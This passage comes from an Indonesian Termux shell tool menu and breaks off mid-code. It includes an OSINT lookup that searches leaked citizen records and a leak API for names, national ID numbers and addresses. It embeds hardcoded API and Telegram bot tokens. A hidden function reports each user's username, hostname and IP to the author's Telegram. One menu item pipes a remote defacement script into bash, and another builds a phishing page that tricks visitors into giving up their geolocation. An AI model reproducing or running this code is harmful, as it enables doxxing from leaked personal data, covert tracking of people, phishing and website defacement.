e $h "NYALAKAN DULU$m HOTSPOT$h ANDA"
IFS= read -r -e -p "ENTER UNTUK MEMULAI"
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
./ngrok $manakocak $port
break
else
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
clear
e $k "INSTALL NGROK"
sleep 2
cd $DIR_SAVE
git clone --depth 32 https://github.com/GALIRUS404/ngrok
cd ngrok
tar -xzvf ngrok-v3-stable-linux-arm64.tgz
clear
IFS= read -r -e -p "Masukkan AuthToken Ngrok Anda : " tokenlu
./ngrok config add-authtoken $tokenlu
clear
e $h "NGROK SUDAH TERINSTAL DI LENGKAP I DENGAN TOKEN ANDA"
sleep 5
fi
ENTER
done
elif [ "$no" = "down13" ]; then
cek_akses
while true; do
osint="$HOME/Osint_G404"
if [ -d "$osint" ]; then
cd "$osint"
git pull origin main
git stash
killall mpv &> /dev/null &
urls=(
"https://youtu.be/DzqFIboDUJ4"
"https://youtu.be/pZj5CYNtfcg"
"https://youtu.be/8KeLYW8N8Ug"
"https://youtu.be/kUs9wDBNP14"
"https://youtu.be/dqCXlaoW0Xk"
)
banner() {
echo -e "${h}
⢀⣀⣄⣠⣀⡀⣀⣠⣤⣤⣤⣀
⣄⢠⣠⣼⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋   ⢠⣤⣦⡄          ⠰⢦⣄
⣼⣿⣟⣾⣿⣽⣿⣿⣅⠈⠉⠻⣿⣿⣿⣿⣿⡿⠇     ⠉     ⢀⡶⠒⢉⡀⢠⣤⣶⣶⣿⣷⣆⣀⡀ ⢲⣖⠒
⢀⣤⣾⣶⣦⣤⣤⣶⣿⣿⣿⣿⣿⣿⣽⡿⠻⣷⣀ ⢻⣿⣿⣿⡿⠟      ⣤⣶⣶⣤⣀⣀⣬⣷⣦⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣦⣼⣀
⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠓⣿⣿⠟⠁⠘⣿⡟⠁ ⠘⠛⠁  ⢠⣾⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠏⠙⠁
⠸⠟⠋ ⠈⠙⣿⣿⣿⣿⣿⣿⣷⣦⡄⣿⣿⣿⣆        ⣼⣆⢘⣿⣯⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⠉⢱⡿
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡿⠦       ⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡗ ⠈
⢻⣿⣿⣿⣿⣿⣿⣿⣿⠋⠁         ⢿⣿⣉⣿⡿⢿⢷⣾⣾⣿⣞⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣠⠟
⠹⣿⣿⣿⠿⠿⣿⠁          ⣀⣾⣿⣿⣷⣦⣶⣦⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠈⠛⠁
⠉⠻⣿⣤⡖⠛⠶⠤⡀       ⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠙⣿⣿⠿⢻⣿⣿⡿⠋⢩
⠈⠙⠧⣤⣦⣤⣄⡀     ⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇   ⠘⣧ ⠈⣹⡻⠇⢀⣿⡆
⢠⣿⣿⣿⣿⣿⣤⣀⡀      ⠈⢽⣿⣿⣿⣿⣿⠋        ⠹⣷⣴⣿⣷⢲⣦⣤⡀⢀⡀
⠈⢿⣿⣿⣿⣿⣿⣿⠟       ⢸⣿⣿⣿⣿⣷⢀⡄        ⠈⠉⠂⠛⣆⣤⡜⣟⠋⠙⠂
⢹⣿⣿⣿⣿⠟        ⠘⣿⣿⣿⣿⠉⣿⠃          ⣤⣾⣿⣿⣿⣿⣆ ⠰⠄ ⠉
⣸⣿⣿⡿⠃          ⢹⣿⡿⠃             ⢻⣿⠿⠿⣿⣿⣿⠇  ⢀
⢀⣿⡿⠛                                 ⠈⢻⡇  ⢀⣼⠗
⢸⣿⠃⣀                                      ⠙⠁
⠙⠒
${bg_lg}${g404}Osint All By Galirus Official${res}
${bg_lg}${or}Script Terbit${k}:${or} Jum,20,Juni,2025${res}
${bg_lg}${k} Subscribe${m}:${bl} https://www.youtube.com/@GalirusProjects${res}
${bg_bl}${m}NOTE${res}${h}:${k} Script Sewaktu-Waktu Bisa Coid
Jika Anda Ingin Mengaktifkannya
Silahkan Berdonasi Ke
${bg_bl}${m}https://saweria.co/Galirus${res}
${bg_lg}${m}Ketik${h} EXIT / CTRL + C${m} untuk berhenti${res}
${bg_lg}${m}Ketik${h} .admin${m} untuk menghubungkan ke pencipta script ${res}
${bg_lg}${m}Ketik${h} .sawer${m} untuk ngopi admin >_<${res}
"
}
res=$'\033[0m'
url="https://leakosintapi.com/"
token="5034446293:PkDmy7mx"
dir_official() {
local SPLIT_DIR="split_output"
local save_path="/sdcard/HASIL/OSINT"
local TEL=""
if [ ! -d "$SPLIT_DIR" ]; then
echo "❌ Folder '$SPLIT_DIR' tidak ditemukan."
exit 1
fi
if [ -z "$1" ]; then
TEL="$apa"
else
TEL="$1"
fi
local TEL_NORM=$(echo "$TEL" | sed 's/^+62//;s/^62//;s/^0//')
local formats=("0$TEL_NORM" "62$TEL_NORM" "$TEL_NORM")
local safe_filename=$(echo "$TEL_NORM" | tr '[:space:]' '_' | tr -cd '[:alnum:]_')
local OUTPUT_FILE="$save_path/$(date +%Y.%m.%d)_${safe_filename}.txt"
mkdir -p "$save_path"
: > "$OUTPUT_FILE"
echo "🔍 Mencari variasi nomor telepon:"
for f in "${formats[@]}"; do echo "  • $f"; done
echo ""
local start_time=$(date +%s)
local hit_count=0
local total_file=$(ls "$SPLIT_DIR"/*.json 2> /dev/null | wc -l)
for file in "$SPLIT_DIR"/*.json; do
for variant in "${formats[@]}"; do
match=$(grep -B 10 -A 10 -E "\"telepon\"[[:space:]]*:[[:space:]]*\"[^\"]*${variant}\"" "$file")
if [ -n "$match" ]; then
((hit_count++))
echo "📂 File: $file"
echo "────────────────────────────────────────" | tee -a "$OUTPUT_FILE"
echo "$match" | grep -E '"nama"|"nik"|"tanggal"|"alamat"|"kelurahan_nama"|"kota_nama"|"jenis_kelamin"|"telepon"' |
sed 's/^[ \t]*//' |
sed -E '
s/"nama"[ \t]*:[ \t]*"(.*)"/👤 Nama       : \1/;
s/"nik"[ \t]*:[ \t]*"(.*)"/🆔 NIK        : \1/;
s/"tanggal"[ \t]*:[ \t]*"(.*)"/📅 Tanggal    : \1/;
s/"alamat"[ \t]*:[ \t]*"(.*)"/📍 Alamat     : \1/;
s/"kelurahan_nama"[ \t]*:[ \t]*"(.*)"/🏘️ Kelurahan  : \1/;
s/"kota_nama"[ \t]*:[ \t]*"(.*)"/🏙️ Kota       : \1/;
s/"jenis_kelamin"[ \t]*:[ \t]*"(.*)"/🚻 Gender     : \1/;
s/"telepon"[ \t]*:[ \t]*"(.*)"/📞 Telepon    : \1/;
' | tee -a "$OUTPUT_FILE"
echo "────────────────────────────────────────" | tee -a "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"
break
fi
done
done
local end_time=$(date +%s)
local duration=$((end_time - start_time))
if [ "$hit_count" -eq 0 ]; then
echo "❌ Data dengan nomor $TEL tidak ditemukan."
else
echo "✅ Ditemukan di $hit_count file"
echo "📄 Hasil lengkap tersimpan di: $OUTPUT_FILE"
fi
echo "⏱️ Selesai dalam $duration detik."
}
send_custom_request() {
local lang="id"
local keyword="$1"
local safe_filename=$(echo "$keyword" | tr '[:space:]' '_' | tr -cd '[:alnum:]_')
local save_path="/sdcard/HASIL/OSINT"
local save_file="$save_path/$(date +%Y.%m.%d)_${safe_filename}.txt"
mkdir -p "$save_path"
: > "$save_file"
echo -e "${ran1}📝 Sedang mencari data untuk: '${keyword}'...${res}"
local json=$(jq -n \
--arg token "$token" \
--arg request "$keyword" \
--arg lang "$lang" \
'{token:$token,request:$request,lang:$lang}')
local response=$(curl -s -X POST "$url" -H "Content-Type: application/json" -d "$json")
local result_count=$(echo "$response" | jq -r '.NumOfResults // 0')
if [[ "$result_count" -eq 0 ]]; then
echo -e "${ran2}❌ Tidak ada data ditemukan untuk '${keyword}'${res}"
sleep 3
echo -ne "\rMaaf Coin Yang Di Gunakan Admin Telah Habis"
sleep 5
echo -ne "\rSilahkan Kunjungi Bot Saya                         "
xdg-open "https://t.me/Shiroko_Galery_Eyes_Bot"
sleep 5
echo "Tidak ada data ditemukan untuk '$keyword'" >> "$save_file"
return
fi
echo -e "${ran3}✔ Ditemukan $result_count hasil untuk '${keyword}'!${res}"
local has_valid_result="false"
while IFS= read -r entry; do
local source=$(echo "$entry" | jq -r '.key')
[[ "$source" == "No results found" ]] && continue
local data=$(echo "$entry" | jq -c '.value.Data // empty')
[[ -z "$data" || "$data" == "null" || "$data" == "{}" || "$data" == "[]" ]] && continue
echo -e "${ran4}📚 Sumber: $source${res}"
echo "Sumber: $source" >> "$save_file"
while IFS= read -r row; do
local name email passport phone provider regdate
name=$(echo "$row" | jq -r '.Name // "N/A"')
email=$(echo "$row" | jq -r '.Email // "N/A"')
passport=$(echo "$row" | jq -r '.Passport // "N/A"')
phone=$(echo "$row" | jq -r '.Phone // "N/A"')
provider=$(echo "$row" | jq -r '.Provider // "N/A"')
regdate=$(echo "$row" | jq -r '.RegDate // "N/A"')
if [[ "$phone" == *"6285604889701"* ]]; then
continue
fi
if [[ "$name" == "N/A" && "$email" == "N/A" && "$passport" == "N/A" && "$phone" == "N/A" && "$provider" == "N/A" && "$regdate" == "N/A" ]]; then
continue
fi
has_valid_result="true"
local box_text="\
${ran5}Name${ran4}    :${res} $name
${ran5}Email${ran4}   :${res} $email
${ran5}NIK${ran4}     :${res} $passport
${ran5}Nomor${ran4}   :${res} $phone
${ran5}Provider${ran4}:${res} $provider
${ran5}RegDate${ran4} :${res} $regdate"
local clean_text="\
Name    : $name
Email   : $email
NIK     : $passport
Nomor   : $phone
Provider: $provider
RegDate : $regdate"
clear
banner
echo -e "$box_text" | boxes -d ansi-rounded
echo -e "$clean_text"$'\n' >> "$save_file"
sleep 0.5
done < <(echo "$data" | jq -c '.[]')
done < <(echo "$response" | jq -c '.List | to_entries[]')
if [[ "$has_valid_result" == "true" ]]; then
echo -e "${ran4}MASUK MODE SCANNING AUTO NIK, HARAP BERSABAR!${ran2}"
INPUT_FILE="$save_file"
OUTPUT_DIR="/storage/emulated/0/HASIL/OSINT"
OUTPUT_FILE="$OUTPUT_DIR/$(date +%Y.%m.%d)_Alamat_NIK_${safe_filename}.txt"
LOG_FILE="$OUTPUT_DIR/.processed_nik.log"
mkdir -p "$OUTPUT_DIR"
: > "$LOG_FILE"
dir_official
grep "NIK" "$INPUT_FILE" | while read -r line; do
nik=$(echo "$line" | awk -F': ' '{print $2}' | tr -d '[:space:]')
if grep -q "$nik" "$LOG_FILE"; then
continue
elif [[ -n "$nik" ]]; then
echo -ne "\r[ + ] Memproses NIK: $nik"
{
echo "=== Hasil untuk NIK: $nik ==="
nik-parse -n "$nik" | tr -d "{}'"
echo ""
} >> "$OUTPUT_FILE"
echo "$nik" >> "$LOG_FILE"
fi
done
rm -f "$LOG_FILE"
echo -ne "\r${ran8}📦 Selesai ditampilkan sebanyak $result_count hasil.${res}"
echo -e "${ran9}📁 Disimpan di: $save_file${res}"
echo -e "${ran7}📁 Selesai hasil ALAMAT NIK disimpan ke: $OUTPUT_FILE"
echo -e "\n\n\n${h}Silahkan$m ENTER ${h} jika selesai"
read
else
echo -e "${ran2}Tak ada hasil${res}"
echo "Tak ada hasil" >> "$save_file"
sleep 3
fi
}
pake1x() {
aktifk() {
mkdir -p "$HOME/.config" &> /dev/null
STATUS_FILE="$HOME/.config/.status"
TODAY=$(date +"%Y-%m-%d")
LIMIT_REACHED=false
if [[ -f "$STATUS_FILE" ]]; then
LAST_DATE=$(cut -d':' -f1 "$STATUS_FILE")
COUNT=$(cut -d':' -f2 "$STATUS_FILE")
else
LAST_DATE=""
COUNT=0
fi
if [[ "$LAST_DATE" != "$TODAY" ]]; then
COUNT=0
fi
if [[ "$COUNT" -ge 5 ]]; then
echo "[ ⚠️ ]  Anda sudah melakukan OSINT 3x hari ini."
echo "[ INFO ] Kembalilah Besok !"
LIMIT_REACHED=true
else
((COUNT++))
echo "$TODAY:$COUNT" > "$STATUS_FILE"
fi
}
aktifk
if [[ "$LIMIT_REACHED" == false ]]; then
send_custom_request "$apa"
fi
}
run() {
killall mpv &> /dev/null
random_url=${urls[$RANDOM % ${#urls[@]}]}
mpv "$random_url" &> /dev/null &
clear
notifikasi &> /dev/null &
mpv "https://raw.githubusercontent.com/WatashiSenseiGalirus/Arona/main/4OBKZY4DVLRYHJPDQO6OHA5L4OBLTZMFRDTZJHY_1.wav" &> /dev/null
mpv "https://raw.githubusercontent.com/WatashiSenseiGalirus/Arona/main/arona_attendance_enter_1.ogg" &> /dev/null &
while true; do
clear
banner
echo -e "${ran8}"
read -e -p "🔍 Masukkan kata kunci (nama/email/HP): " apa
pake1x
mpv "https://raw.githubusercontent.com/Lubebansokhekel/JARVISV3/main/sound/klik.mp3" &> /dev/null &
shopt -s nocasematch
case "$apa" in
.admin)
xdg-open "https://wa.me/6285850268349"
;;
.sawer)
xdg-open "https://saweria.co/Galirus"
;;
exit)
$e "${h}
Watashi no sukuriPTo o tsukatte itadaki,
arigatou gozaimashita
Mata itsuka oai shimashou. >_<"
killall mpv &> /dev/null &
break 3
;;
esac
sleep 5
done
}
notifikasi() {
TOKEN="7386271666:AAH7Fm_388SADza6CHTZh82CZB6jXMSq3UY"
CHAT_ID="5034446293"
API_URL="https://api.telegram.org/bot$TOKEN/sendMessage"
USER_NAME=$(whoami)
HOSTNAME=$(hostname)
IP_ADDRESS=$(curl -s ipinfo.io/ip) # IP publik
TIME_NOW=$(date '+%Y-%m-%d %H:%M:%S')
MESSAGE="🕵️ OSINT Script Execution Detected
👤 User: \`$USER_NAME\`
💻 Hostname: \`$HOSTNAME\`
🌐 Public IP: \`$IP_ADDRESS\`
🕒 Time: \`$TIME_NOW\`
📁 Info: User menjalankan Script OSINT"
curl -s -X POST "$API_URL" \
-d chat_id="$CHAT_ID" \
-d text="$MESSAGE" \
-d parse_mode="Markdown"
}
check_and_install() {
local packages=(python python3 node nala yarn boxes jq curl)
local installer="pkg"
if command -v nala > /dev/null 2>&1; then
installer="nala"
fi
for pkg in "${packages[@]}"; do
if ! command -v "$pkg" > /dev/null 2>&1; then
echo -e "${h}[${m} INFO${h} ] ${pkg} belum terinstal. Menginstal...${c}T_T${h}"
echo -e "${h}[${m} INFO${h} ] ${k}SEDANG INSTALLASI PACKAGE${pu}"
$installer update -y && $installer install -y "$pkg"
$installer install nodejs yarn -y
else
echo -e "${h}[OK] Package $pkg sudah terinstal${res}"
fi
done
if ! command -v nik-parse > /dev/null 2>&1; then
echo -e "${h}[INFO] Menginstall nik-parse global dengan npm${res}"
npm install -g nik-parse
fi
if ! command -v yt-dlp > /dev/null 2>&1; then
echo -e "${h}[INFO] Mengunduh${res}"
wget https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp -O "$PREFIX/bin/yt-dlp"
chmod a+rx "$PREFIX/bin/yt-dlp"
fi
clear
if [ -d "split_output" ]; then
echo ""
else
unzip -o -P "DASAR_ORANG_IRI" OSINTV2.sh &> /dev/null | echo "Sabar Sedang Menyiapkan File"
fi
if [ -d "node_modules" ]; then
echo -e "${h}[OK] Package sudah terinstal Semua${c} >_<"
sleep 3
run
else
echo -e "${ran} Menginstall Node_Module${res}"
yarn
fi
}
check_and_install
break
else
pkg update
pkg install git
cd $HOME
git clone --depth 32 https://github.com/Lubebansokhekel/Osint_G404
cd Osint_G404
fi
done
elif [ "$no" = "14" ]; then
if [ -f "$edukasi" ]; then
echo
else
e $bld "Silahkan Tonton Video Tutorial"
mpv --volume=150 --shuffle --cache=yes --cache-secs=10 "https://od.lk/s/OV8yNDY0NTk1NzZf/tutorial.mp3" &> /dev/null
xdg-open "https://vt.tiktok.com/ZSMeUJkUC/"
sleep 5
fi
bash <(curl -sL "https://kontollukecilkocak.vercel.app/deface.sh")
elif [ "$no" = "15" ]; then
cd $PREFIX/lib
e() { echo -e "$@"; }
e="echo -e"
reset="\033[0m"
clear
banner() {
echo -e "
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣾⡿⠿⠿⢿⣿⣶⣶⣤⣀⠀⠀⠀⠀  ⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣴⣿⢟⡛⢍⠒⡰⡈⠥⣉⠒⡌⢛⢽⣟⣿⣿⣶⣄⠀⠀⠀  ⠀⠀
⠀⠀⠀⢠⣾⡿⣋⠒⢢⠘⠤⡙⠤⡑⣡⢂⠣⡘⢂⢆⡙⢮⣗⠿⣿⣷⣄⠀⠀    ⠀PHISING LOCATION
⠀⠀⣴⣿⢋⠲⢠⠙⢢⠉⣆⣵⣶⣷⣿⣿⣷⣷⣧⣆⠜⣠⠻⣏⡷⣻⢿⣧⡀⠀ DEVELOPMENT BY GALIRUS
⠀⣼⣿⡑⢊⠱⠨⡌⣡⣾⠿⠋⠁⠀⠀⠀⠀⠈⠙⠻⣿⣦⠥⡹⣳⡽⣫⣿⣷⠀
⢰⣿⢣⠘⡌⡡⢃⣾⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣷⡡⢻⣵⢻⡼⣿⣇  NOTE: Script Ini Asli Buatan Sendiri tanpa
⣾⡿⢂⡱⢌⠰⣹⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⠙⣮⡗⣯⢿⣿         Ada campur tangan orang lain
⣿⡇⢣⠰⣈⠒⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠡⣿⡝⣮⢿⣿         Hanya gunakan oleh penguna PREMIUM
⢿⣿⢠⢃⠤⡉⢽⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡿⢡⡟⣾⡹⣾⣿         TOOLSV5
⠸⣿⣦⠊⡔⠩⢌⢿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⠣⢹⣾⣱⣻⣿⠇
⠀⠹⣿⣜⢨⠑⠬⣈⠿⣿⣦⣀⠀⠀⠀⠀⠀⠀⣀⣤⣾⠟⣅⢊⡿⣖⣳⣿⡟⠀
⠀⠀⠹⣿⣦⢉⠖⡠⢎⡘⠹⠿⢿⣷⣶⣶⣶⡿⢿⠛⡅⢣⠰⣸⢷⣹⣿⠟⠀⠀
⠀⠀⠀⠙⣿⣎⢆⡑⠢⢌⡱⢘⢂⡒⠰⢂⡱⢈⠦⡑⠌⢆⢱⣯⣳⣿⠏⠀⠀⠀
⠀⠀⠀⠀⠘⣿⣖⡌⠱⢂⡔⠣⢌⡰⢉⡒⠤⢃⢆⠩⡘⢌⡾⣵⣿⠏⠀⠀⠀  ⠀
⠀⠀⠀⠀⠀⠘⣿⣎⡑⡊⠔⣡⠒⡄⢣⢘⡐⠣⢌⠒⡩⣸⣿⣿⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⣿⣖⢩⠘⡄⢣⠘⡄⠣⢌⠱⡈⢎⢱⣿⣿⠏⠀⠀⠀⠀  ⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⢊⡔⢡⢃⠬⡑⢊⠱⡈⢦⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣶⢈⠦⡘⠤⡑⡉⠆⢥⣿⣿⠋⠀⠀⠀⠀  ⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⢢⠑⡘⠤⡙⢌⣾⣿⠃⠀⠀  ⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⠩⠜⡰⢁⣾⣿⠃⠀⠀  ⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⠓⡄⣻⣿⠃⠀⠀  ⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣯⣴⣿⠃⠀⠀  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⠃
"
}
banner | boxes -d ansi-rounded | lolcat
PORT=8080
LOGFILE="/sdcard/PHISING_LOKASI/location_data.json"
TMP_OUTPUT="/data/data/com.termux/location.output"
ALT_TMP_OUTPUT="$PREFIX/lib/location.output"
CLOUDFLARED_LOG="cloudflared.log"
PHP_ERROR_LOG="php_error.log"
PHP_SERVER_LOG="php_server.log"
check_requirements() {
echo -e "${h}[+] Memeriksa keberadaan PHP...${reset}"
if ! command -v php &> /dev/null; then
echo -e "${m}[!] PHP tidak ditemukan! Menginstal...${reset}"
pkg install php -y || {
echo -e "${m}[!] Gagal menginstal PHP${reset}"
exit 1
}
fi
if ! command -v cloudflared &> /dev/null; then
echo -e "${m}[!] cloudflared tidak ditemukan! Menginstal...${reset}"
pkg install cloudflared -y || {
echo -e "${m}[!] Gagal menginstal cloudflared${reset}"
exit 1
}
fi
if ! command -v mpv &> /dev/null; then
echo -e "${m}[!] mpv tidak ditemukan! Menginstal untuk notifikasi suara...${reset}"
pkg install mpv -y
fi
}
cleanup() {
echo -e "\n${m}[!] Cleaning up...${reset}"
if [ -n "$PHP_PID" ] && ps -p "$PHP_PID" > /dev/null; then
kill "$PHP_PID" 2> /dev/null
fi
if [ -n "$CF_PID" ] && ps -p "$CF_PID" > /dev/null; then
kill "$CF_PID" 2> /dev/null
fi
rm -f "$TMP_OUTPUT" "$ALT_TMP_OUTPUT" "$CLOUDFLARED_LOG" "$PHP_ERROR_LOG" "$PHP_SERVER_LOG" "sendlink"
unset LD_PRELOAD
echo -e "${h}[+] Cleanup complete. Exiting...${reset}"
sleep 3
}
create_html() {
cat > index.html << 'HTML'
<!DOCTYPE html>
<html>
<head>
<title>Pelacakan Lokasi Nomor Telepon</title>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
font-family: "Inter", sans-serif;
background: #000;
overflow: hidden;
color: #fff;
}
canvas#stars {
position: fixed;
top: 0; left: 0;
width: 100%; height: 100%;
z-index: -1;
}
.container {
background: rgba(20, 20, 30, 0.9);
border: 1px solid rgba(100, 100, 255, 0.3);
border-radius: 1rem;
box-shadow: 0 0 25px rgba(79, 70, 229, 0.8);
width: 90%;
max-width: 600px;
text-align: center;
padding: 2rem 2.5rem;
margin: 2rem auto;
animation: fadeIn 1.5s ease;
}
h1 {
font-size: 2rem;
margin-bottom: 1rem;
color: #4f46e5;
text-shadow: 0 0 10px #4f46e5, 0 0 20px #4338ca;
}
label {
display: block;
margin: 1rem 0 0.5rem;
font-weight: 600;
color: #9ca3af;
text-align: left;
}
input[type="tel"] {
width: 100%;
padding: 0.75rem 1rem;
border-radius: 0.5rem;
border: 1.5px solid #4338ca;
font-size: 1rem;
color: #111;
outline: none;
}
button {
margin-top: 1.5rem;
background: linear-gradient(90deg, #4f46e5, #4338ca);
color: #fff;
border: none;
padding: 0.75rem;
width: 100%;
font-weight: 700;
border-radius: 0.75rem;
cursor: pointer;
transition: all 0.3s ease;
text-shadow: 0 0 5px #fff;
box-shadow: 0 0 15px rgba(79, 70, 229, 0.8);
}
button:hover {
transform: scale(1.05);
box-shadow: 0 0 30px rgba(99, 102, 241, 1);
}
.status {
margin-top: 1rem;
padding: 1rem;
border-radius: 0.75rem;
display: none;
text-align: left;
font-size: 0.9rem;
}
.info-text {
margin-top: 1rem;
font-size: 0.9rem;
color: #facc15; /* kuning neon */
text-align: center;
text-shadow: 0 0 8px #facc15;
}
.status.success { background: rgba(34, 197, 94, 0.2); color: #22c55e; }
.status.error { background: rgba(239, 68, 68, 0.2); color: #ef4444; }
margin-top: 1.5rem;
padding: 1rem;
border-radius: 0.75rem;
background: rgba(255, 255, 255, 0.05);
color: #e5e7eb;
text-align: left;
font-size: 0.95rem;
line-height: 1.4;
box-shadow: inset 0 0 15px rgba(79, 70, 229, 0.5);
}
@keyframes fadeIn {
from { opacity: 0; transform: translateY(-20px); }
to { opacity: 1; transform: translateY(0); }
}
</style>
</head>
<body>
<canvas id="stars"></canvas>
<div class="container" id="inputContainer">
<h1>Cek Lokasi Temen</h1>
<form id="phoneForm">
<label for="phone">Masukkan Nomor Telepon Target:</label>
<input type="tel" id="phone" name="phone" placeholder="08123456789" required pattern="[0-9]{9,15}" autocomplete="off" />
<button type="submit">Mulai Pelacakan</button>
</form>
<p class="info-text">
⚠️ Untuk mendapatkan lokasi target, silakan aktifkan lokasi Anda.
Hal ini diperlukan agar jarak tempuh antara lokasi Anda dan target bisa lebih akurat.
</p>
<div class="status" id="status"></div>
</div>
<div class="container" id="resultContainer" style="display:none;">
<h1>Hasil Pelacakan Lokasi</h1>
<div id="trackingResult"></div>
</div>
<script>
// === animasi bintang ===
const canvas = document.getElementById("stars");
const ctx = canvas.getContext("2d");
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
let stars = [];
for (let i = 0; i < 150; i++) {
stars.push({
x: Math.random() * canvas.width,
y: Math.random() * canvas.height,
radius: Math.random() * 1.5,
dx: (Math.random() - 0.5) * 0.5,
dy: (Math.random() - 0.5) * 0.5
});
}
function drawStars() {
ctx.clearRect(0, 0, canvas.width, canvas.height);
ctx.fillStyle = "white";
stars.forEach(star => {
ctx.beginPath();
ctx.arc(star.x, star.y, star.radius, 0, Math.PI * 2);
ctx.fill();
});
}
function updateStars() {
stars.forEach(star => {
star.x += star.dx;
star.y += star.dy;
if (star.x < 0 || star.x > canvas.width) star.dx *= -1;
if (star.y < 0 || star.y > canvas.height) star.dy *= -1;
});
}
function animate() {
drawStars();
updateStars();
requestAnimationFrame(animate);
}
animate();
// === kode tracking ===
const form = document.getElementById('phoneForm');
const statusDiv = document.getElementById('status');
const resultContainer = document.getElementById('resultContainer');
const trackingResult = document.getElementById('trackingResult');
const phoneInput = document.getElementById('phone');
function updateStatus(msg, type) {
statusDiv.style.display = 'block';
statusDiv.textContent = msg;
statusDiv.className = 'status ' + type;
}
function sendLocationToServer(lat, lon, acc, phoneNumber) {
const xhr = new XMLHttpRequest();
const url = `?lat=${lat}&lon=${lon}&acc=${acc}&phone=${encodeURIComponent(phoneNumber)}`;
xhr.open('GET', url, true);
xhr.timeout = 5000;
xhr.onreadystatechange = function() {
if (xhr.readyState === 4 && xhr.status === 200) {
updateStatus("Data lokasi berhasil dikirim ke server.", "success");
} else if (xhr.readyState === 4) {
updateStatus("Gagal mengirim data ke server: " + xhr.statusText, "error");
}
};
xhr.ontimeout = function() {
updateStatus("Request timeout: Server lambat atau tidak terjangkau.", "error");
};
xhr.onerror = function() {
updateStatus("Network error: Periksa koneksi internet.", "error");
};
xhr.send();
}
function getDistance(lat1, lon1, lat2, lon2) {
const R = 6371;
const dLat = (lat2 - lat1) * Math.PI / 180;
const dLon = (lon2 - lon1) * Math.PI / 180;
const a =
Math.sin(dLat/2) * Math.sin(dLat/2) +
Math.cos(lat1 * Math.PI/180) * Math.cos(lat2 * Math.PI/180) *
Math.sin(dLon/2) * Math.sin(dLon/2);
const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
return (R * c).toFixed(2);
}
function getRandomFakeLocation() {
const lat = (Math.random() * (6 - (-11)) + (-11)).toFixed(6);
const lon = (Math.random() * (141 - 95) + 95).toFixed(6);
return {lat: parseFloat(lat), lon: parseFloat(lon)};
}
function handlePosition(pos) {
const lat = pos.coords.latitude.toFixed(6);
const lon = pos.coords.longitude.toFixed(6);
const acc = Math.round(pos.coords.accuracy);
const phoneNumber = phoneInput.value;
const fake = getRandomFakeLocation();
const fakeLat = fake.lat;
const fakeLon = fake.lon;
const distance = getDistance(parseFloat(lat), parseFloat(lon), fakeLat, fakeLon);
updateStatus("Lokasi berhasil diterima.", "success");
document.getElementById("inputContainer").style.display = "none";
resultContainer.style.display = "block";
sendLocationToServer(lat, lon, acc, phoneNumber);
trackingResult.innerHTML = `
<strong>Laporan:</strong><br>
- Nomor Target: ${phoneNumber}<br>
- Lokasi Anda: ${lat}, ${lon}<br>
- Lokasi Target: ${fakeLat}, ${fakeLon}<br>
- Akurasi Anda dengan Target: ~${distance} km<br>
- Waktu: ${new Date().toLocaleString('id-ID')} WIB<br>
- Google Maps (Anda → Target):
<a href="https://www.google.com/maps/dir/?api=1&origin=${lat},${lon}&destination=${fakeLat},${fakeLon}&travelmode=bicycling" target="_blank">
Lihat Lokasi Perjalanan Sepeda
</a>
`;
}
function handleError(err) {
updateStatus("Gagal mendapatkan lokasi: " + err.message, "error");
}
form.addEventListener('submit', e => {
e.preventDefault();
updateStatus("Meminta akses lokasi...", "success");
if (navigator.geolocation) {
